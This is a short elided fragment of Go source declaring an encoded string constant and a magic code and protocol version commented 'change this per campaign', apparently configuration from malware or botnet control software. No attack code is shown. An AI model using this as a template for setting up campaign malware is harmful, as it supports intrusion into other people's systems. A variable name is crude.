...
const gothTits = "sfasdfasdfb2FhZg=="  //change me run setup.py
...
const (
	magicCode       = "nvHW6ey&YCygR$ho" //change this per campaign
	protocolVersion = "V5_5"	//change this per campaign
)
